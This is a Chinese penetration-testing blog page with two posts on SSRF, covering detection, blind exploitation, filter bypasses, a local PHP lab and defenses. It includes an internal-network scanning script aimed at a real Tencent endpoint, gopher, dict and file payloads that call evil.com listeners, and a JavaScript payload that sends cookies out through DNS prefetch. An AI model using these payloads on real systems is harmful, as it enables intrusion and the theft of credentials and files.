<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">port = &apos;80&apos;</span><br><span class="line"># fuzz local C </span><br><span class="line">for c in xrange(0,255):</span><br><span class="line">    for d in xrange(0,255):</span><br><span class="line">        ip = &apos;10.xx.&#123;0&#125;.&#123;1&#125;&apos;.format(c,d)</span><br><span class="line">        payload = &apos;http://&#123;ip&#125;:&#123;port&#125;/&apos;.format(ip=ip,port=port)</span><br><span class="line">        url = &apos;http://share.v.t.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=&#123;payload&#125;&apos;.format(</span><br><span class="line">            payload=payload)</span><br><span class="line">        # len(&#123;&quot;ret&quot;:1&#125;) == 9</span><br><span class="line">        if len(requests.get(url).content) != 9:</span><br><span class="line">            print ip, port, &apos;OPEN&apos;, requests.get(url).content</span><br></pre></td></tr></table></figure>

<p>更多内容可参考文章<a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html" target="_blank" rel="noopener">1</a> [2](<a href="http://thehiddenwiki.pw/files/hacking/Attacks" target="_blank" rel="noopener">http://thehiddenwiki.pw/files/hacking/Attacks</a> and sockets: smorgasbord of vulnerabilities.pdf) <a href="http://xss.one/bug_detail.php?wybug_id=wooyun-2016-0215779" target="_blank" rel="noopener">猪猪侠</a>。</p>
<h3 id="2-WEB层面图片SSRF无回显之SSRF盲打利用"><a href="#2-WEB层面图片SSRF无回显之SSRF盲打利用" class="headerlink" title="2.WEB层面图片SSRF无回显之SSRF盲打利用"></a>2.WEB层面图片SSRF无回显之SSRF盲打利用</h3><h4 id="从XSS到SSRF"><a href="#从XSS到SSRF" class="headerlink" title="从XSS到SSRF"></a><strong>从XSS到SSRF</strong></h4><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095425-13dc6b6a-d8ee-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095425-13dc6b6a-d8ee-1.png" alt="img"></a></p>
<p>上图是一次XSS的测试，在经过各种测试之后发现已被过滤的非常严了，各种绕然而并不存在任何XSS问题。然而就这这样结束了吗，其实还存在一个测试点。相信在测试图片XSS经常会遇到如下情况：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095441-1d011c72-d8ee-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095441-1d011c72-d8ee-1.png" alt="img"></a></p>
<p>对添加的图片会又被GET请求一次，然后图片url地址又是我们可控制的。这时测试面就逃离了限制更加开阔了。为此，只需从外部站点获取一个文件即可，只要该文件含有相应的恶意payload，并且其内容类型为html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：` `http://localhost:4567/?url=http://brutelogic.com.br/poc.svg`或者`http://127.0.0.1:22</span><br></pre></td></tr></table></figure>

<p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL，若存在回显利用方式比较多 。但是若遇到无回显的SSRF。利用方式又值得探讨一番。</p>
<h4 id="Bool型SSRF"><a href="#Bool型SSRF" class="headerlink" title="Bool型SSRF"></a>Bool型SSRF</h4><p>BOOL型SSRF与一般的SSRF的区别在步骤二应用识别,步骤三攻击Payload和步骤四Payload Result. 一般的SSRF在应用识别阶段返回的信息相对较多,比如Banner信息,HTTP Title信息,更有甚的会将整个HTTP的Reponse完全返回. 而Bool型SSRF的却永远只有True or False.</p>
<p> 对于Bool型SSRF, 我们不能说Payload打过去就一定成功执行, 就算是返回True, 也不能保证Payload一定执行成功. 所以我们要验证Payload的执行状态信息.</p>
<h4 id="SSRF之盲打SSRF"><a href="#SSRF之盲打SSRF" class="headerlink" title="SSRF之盲打SSRF"></a>SSRF之盲打SSRF</h4><p>无回显情况下通过VPS NC监听所有URL Schema存在情况</p>
<p>1.测试URL Schema</p>
<p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL Schema：</p>
<ul>
<li>file:///</li>
<li>dict://</li>
<li>sftp://</li>
<li>ldap://</li>
<li>tftp://</li>
<li>gopher://</li>
</ul>
<h5 id="file"><a href="#file" class="headerlink" title="file://"></a><strong>file://</strong></h5><p>这种URL Schema可以尝试从文件系统中获取文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure>

<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
<h5 id="dict"><a href="#dict" class="headerlink" title="dict://"></a><strong>dict://</strong></h5><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/ </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>

<h5 id="sftp"><a href="#sftp" class="headerlink" title="sftp://"></a><strong>sftp://</strong></h5><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/ </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*] </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure>

<h5 id="ldap-或ldaps-或ldapi"><a href="#ldap-或ldaps-或ldapi" class="headerlink" title="ldap://或ldaps:// 或ldapi://"></a><strong>ldap://或ldaps:// 或ldapi://</strong></h5><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure>

<h5 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a><strong>tftp://</strong></h5><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET </span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure>

<h5 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a><strong>gopher://</strong></h5><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">Gopher</a>是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php  header(&apos;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&apos;);?&gt;</span><br><span class="line"> evil.com:# nc -lvp 1337</span><br><span class="line"> Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure>

<h4 id="利用技巧-1"><a href="#利用技巧-1" class="headerlink" title="利用技巧"></a><strong>利用技巧</strong></h4><p>dnslog无回显解决</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.107.1:8080/ssrf.php?url=http://php.nf9eex.dnslog.cn</span><br></pre></td></tr></table></figure>

<p><em>ps:dnslog绕过xss-csp</em></p>
<p><em>DNS预解析可以绕过CSP进行解析，结合DNSLOG我们即可窃取在CSP保护下的Cookie。</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Payload</span><br><span class="line">document.querySelector(&apos;body&apos;).innerHTML += &quot;&lt;link rel=&apos;dns-prefetch&apos; href=&apos;&quot; + window.btoa(document.cookie.split(/;|=/)[1]) + &quot;.4q9z30.dnslog.cn&apos;&gt;&quot;</span><br><span class="line"></span><br><span class="line">#执行结果</span><br><span class="line">R0ExLjIuMTY0MjI2NDMxNi4xNTMyNTc0NTg3.4q9z30.dnslog.cn **.**.**.**   2019-07-27 10:45</span><br></pre></td></tr></table></figure>

<p>dnslog ssrf外更多利用<a href="https://weiyigeek.club/2019/04/17/模糊测试之攻击回显.html" target="_blank" rel="noopener">参考</a></p>
<p>综合利用</p>
<p>Bool型SSRF是根据返回包中的state进行判断，当state为”远程连接出错”或者为“SUCCESS”时表示该主机存在，且对应的端口为开放状态。对于Bool型SSRF ，页面仅返回了状态， 而没有更多别的信息，要想进一步利用，可根据如下的思路：</p>
<p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;查看结果</p>
<p>1）内网探测</p>
<p>a:验证URL Schema存在情况，并通过自动化脚本探测内网，查看内网开放的主机和端口 。</p>
<p>2)应用识别</p>
<p>根据存在的端口进行应用识别</p>
<p>3）构造攻击Payload</p>
<p>根据识别的应用和漏洞构造对应payload进行验证</p>
<p>4）查看结果</p>
<h4 id="盲打案例"><a href="#盲打案例" class="headerlink" title="盲打案例"></a><strong>盲打案例</strong></h4><p>可结合以下三篇，进行参考。</p>
<p><a href="https://www.wtfsec.org/5651/ueditor-ssrf漏洞jsp版本分析与复现" target="_blank" rel="noopener">ueditor-ssrf漏洞jsp版本</a></p>
<p><a href="https://www.uedbox.com/post/10524/" target="_blank" rel="noopener">Bool型SSRF的思考与实践</a></p>
<p><a href="https://blog.csdn.net/Fly_hps/article/details/84396690" target="_blank" rel="noopener">腾讯某处SSRF漏洞</a></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>1.禁止跳转</p>
<p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
<p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
<p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
<p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<p><strong>参考：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;https://nosec.org/home/detail/2167.html&gt;</span><br><span class="line">https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#</span><br><span class="line">https://evilcos.me/?p=221</span><br><span class="line">https://www.jianshu.com/p/b31b7b1ca3cb</span><br></pre></td></tr></table></figure>
          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/SSRF实战攻防/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/17/SSRF实战攻防/" class="post-title-link" itemprop="url">SSRF实战攻防</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-17 23:32:21 / 修改时间：23:33:51" itemprop="dateCreated datePublished" datetime="2019-10-17T23:32:21+08:00">2019-10-17</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-SSRF漏洞"><a href="#1-SSRF漏洞" class="headerlink" title="1. SSRF漏洞"></a>1. SSRF漏洞</h1><h2 id="1-1-漏洞简介"><a href="#1-1-漏洞简介" class="headerlink" title="1.1 漏洞简介"></a>1.1 漏洞简介</h2><p> SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p> 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。</p>
<h2 id="1-3-漏洞危害"><a href="#1-3-漏洞危害" class="headerlink" title="1.3 漏洞危害"></a>1.3 漏洞危害</h2><h3 id="1-3-1-扫描内网开放服务"><a href="#1-3-1-扫描内网开放服务" class="headerlink" title="1.3.1 扫描内网开放服务"></a>1.3.1 扫描内网开放服务</h3><h3 id="1-3-2-向内部任意主机的任意端口发送payload来攻击内网服务"><a href="#1-3-2-向内部任意主机的任意端口发送payload来攻击内网服务" class="headerlink" title="1.3.2 向内部任意主机的任意端口发送payload来攻击内网服务"></a>1.3.2 向内部任意主机的任意端口发送payload来攻击内网服务</h3><h3 id="1-3-3-DOS攻击（请求大文件，始终保持连接Keep-Alive-Always）"><a href="#1-3-3-DOS攻击（请求大文件，始终保持连接Keep-Alive-Always）" class="headerlink" title="1.3.3 DOS攻击（请求大文件，始终保持连接Keep-Alive Always）"></a>1.3.3 DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</h3><h3 id="1-3-4-攻击内网的web应用，例如直接SQL注入、XSS攻击等"><a href="#1-3-4-攻击内网的web应用，例如直接SQL注入、XSS攻击等" class="headerlink" title="1.3.4 攻击内网的web应用，例如直接SQL注入、XSS攻击等"></a>1.3.4 攻击内网的web应用，例如直接SQL注入、XSS攻击等</h3><h3 id="1-3-5-利用file、gopher、dict协议读取本地文件、执行命令等"><a href="#1-3-5-利用file、gopher、dict协议读取本地文件、执行命令等" class="headerlink" title="1.3.5 利用file、gopher、dict协议读取本地文件、执行命令等"></a>1.3.5 利用file、gopher、dict协议读取本地文件、执行命令等</h3><h1 id="2-检测与绕过"><a href="#2-检测与绕过" class="headerlink" title="2. 检测与绕过"></a>2. 检测与绕过</h1><h2 id="2-1-漏洞检测"><a href="#2-1-漏洞检测" class="headerlink" title="2.1 漏洞检测"></a>2.1 漏洞检测</h2><p>假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</span><br></pre></td></tr></table></figure>

<p>那么网站请求的大概步骤应该是类似以下：</p>
<p>用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求的数据加载到前台显示。</p>
<p>这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://127.0.0.1:22</span><br></pre></td></tr></table></figure>

<p>如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)</span><br><span class="line">http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line">http、https、file、gopher、phar、dict、ftp、ssh、telnet...</span><br><span class="line">java:</span><br><span class="line">http、https、file、ftp、jar、netdoc、mailto...</span><br></pre></td></tr></table></figure>

<p>判断漏洞是否存在的重要前提是，请求的服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</span><br></pre></td></tr></table></figure>

<p>链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。</p>
<h2 id="2-2-漏洞出现点"><a href="#2-2-漏洞出现点" class="headerlink" title="2.2 漏洞出现点"></a>2.2 漏洞出现点</h2><h3 id="2-2-1-分享"><a href="#2-2-1-分享" class="headerlink" title="2.2.1 分享"></a>2.2.1 分享</h3><p>通过url 地址分享文章，例如如下地址：</p>
<p><a href="http://share.xxx.com/index.php?url=http://127.0.0.1" target="_blank" rel="noopener">http://share.xxx.com/index.php?url=http://127.0.0.1</a></p>
<p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p>
<h3 id="2-2-2-图片加载与下载"><a href="#2-2-2-图片加载与下载" class="headerlink" title="2.2.2 图片加载与下载"></a>2.2.2 图片加载与下载</h3><p>通过URL地址加载或下载图片</p>
<p><a href="http://image.xxx.com/image.php?image=http://127.0.0.1" target="_blank" rel="noopener">http://image.xxx.com/image.php?image=http://127.0.0.1</a></p>
<p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p>
<h3 id="2-2-3-图片、文章收藏功能"><a href="#2-2-3-图片、文章收藏功能" class="headerlink" title="2.2.3 图片、文章收藏功能"></a>2.2.3 图片、文章收藏功能</h3><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de" target="_blank" rel="noopener">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
<h3 id="2-2-4-利用参数中的关键字来查找"><a href="#2-2-4-利用参数中的关键字来查找" class="headerlink" title="2.2.4 利用参数中的关键字来查找"></a>2.2.4 利用参数中的关键字来查找</h3><p>例如以下的关键字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">share</span><br><span class="line">wap</span><br><span class="line">url</span><br><span class="line">link</span><br><span class="line">src</span><br><span class="line">source</span><br><span class="line">target</span><br><span class="line">u</span><br><span class="line">3g</span><br><span class="line">display</span><br><span class="line">sourceURl</span><br><span class="line">imageURL</span><br><span class="line">domain</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="2-3-漏洞绕过"><a href="#2-3-漏洞绕过" class="headerlink" title="2.3 漏洞绕过"></a>2.3 漏洞绕过</h2><p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p>
<h3 id="2-3-1-限制为http-www-xxx-com-域名时"><a href="#2-3-1-限制为http-www-xxx-com-域名时" class="headerlink" title="2.3.1 限制为http://www.xxx.com 域名时"></a>2.3.1 限制为<a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com</a> 域名时</h3><p>可以尝试采用http基本身份认证的方式绕过，<a href="http://www.xxx.com@www.xxc.com./" target="_blank" rel="noopener">http://www.xxx.com@www.xxc.com。</a><br>在对@解析域名中，不同的处理函数存在处理差异，例如：<br><a href="http://www.aaa.com%40www.bbb.com@www.ccc.xn--com%2Cphpparse_urlwww-lx83ah6kp7u060a900oqcpe.ccc.xn--com%2Clibcurlwww-bx7vp49b0iau304e5tvb.bbb.com./" target="_blank" rel="noopener">http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</a></p>
<h3 id="2-3-2-限制请求IP不为内网地址"><a href="#2-3-2-限制请求IP不为内网地址" class="headerlink" title="2.3.2 限制请求IP不为内网地址"></a>2.3.2 限制请求IP不为内网地址</h3><p>采用短网址绕过，比如百度短地址<a href="https://dwz.cn/。" target="_blank" rel="noopener">https://dwz.cn/。</a><br>采用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1<br>采用进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143041-59c04d34-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143041-59c04d34-ce14-1.png" alt="img"></a></p>
<h3 id="2-3-3-限制请求只为http协议"><a href="#2-3-3-限制请求只为http协议" class="headerlink" title="2.3.3 限制请求只为http协议"></a>2.3.3 限制请求只为http协议</h3><p>采用302跳转，百度短地址，或者使用<a href="https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd.xn--:-mo6a99b62wez8a/" target="_blank" rel="noopener">https://tinyurl.com生成302跳转地址。使用如下：</a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143042-5a578c80-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143042-5a578c80-ce14-1.png" alt="img"></a></p>
<h3 id="2-3-4-其他"><a href="#2-3-4-其他" class="headerlink" title="2.3.4 其他"></a>2.3.4 其他</h3><p>其他绕过形式可以查看：<a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a></p>
<h1 id="3-测试方法"><a href="#3-测试方法" class="headerlink" title="3. 测试方法"></a>3. 测试方法</h1><h2 id="3-1-漏洞环境"><a href="#3-1-漏洞环境" class="headerlink" title="3.1 漏洞环境"></a>3.1 漏洞环境</h2><p>PHP脚本、Windows</p>
<h2 id="3-2-利用工具"><a href="#3-2-利用工具" class="headerlink" title="3.2 利用工具"></a>3.2 利用工具</h2><p>bash、nc</p>
<h2 id="3-3-测试过程"><a href="#3-3-测试过程" class="headerlink" title="3.3 测试过程"></a>3.3 测试过程</h2><p>首先采用如下脚本创建一个PHP的服务端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]); </span><br><span class="line">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>开启PHP的web环境，访问<a href="http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。" target="_blank" rel="noopener">http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。</a></p>
<p>浏览器访问如下链接：<code>http://localhost/ssrf.php?url=http://127.0.0.1:2233</code>。监听端可以看到来自localhost的请求，请求目标为127.0.0.1的2233端口。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143042-5acbbb78-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143042-5acbbb78-ce14-1.png" alt="img"></a></p>
<p>使用gopher协议来查看协议，访问：<code>http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_test</code></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143043-5b220ae6-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143043-5b220ae6-ce14-1.png" alt="img"></a></p>
<p>利用gopher发送POST的请求，访问：<code>http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword</code></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143044-5b6ebb70-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143044-5b6ebb70-ce14-1.png" alt="img"></a></p>
<p>以上方式简单的展示了SSRF的攻击过程和请求，下面我们使用回显形SSRF。</p>
<p>漏洞环境：Ubuntu 18、 docker 、PHP、Apache</p>
<p>漏洞文件地址：<a href="https://github.com/nikosdano/SSRF-Vulnerable-with-Curl" target="_blank" rel="noopener">https://github.com/nikosdano/SSRF-Vulnerable-with-Curl</a></p>
<p>下载文件放入apache服务器中，访问<a href="http://192.168.120.132/awesome_script.php" target="_blank" rel="noopener">http://192.168.120.132/awesome_script.php</a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143044-5bbc8b02-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143044-5bbc8b02-ce14-1.png" alt="img"></a></p>
<p>在其中我们可以填写想要执行的SSRF命令，如填写<code>file:///etc/passwd</code>，回显为：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143045-5c08d0fc-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143045-5c08d0fc-ce14-1.png" alt="img"></a></p>
<p>尝试端口探测，对22端口进行探测是否开启：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143045-5c4d2e1e-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143045-5c4d2e1e-ce14-1.png" alt="img"></a></p>
<p>截至到此，相信对SSRF已经有了一个简单认识和检测，下面我们利用一个靶场来模拟一个完整的真实的SSRF攻击。</p>
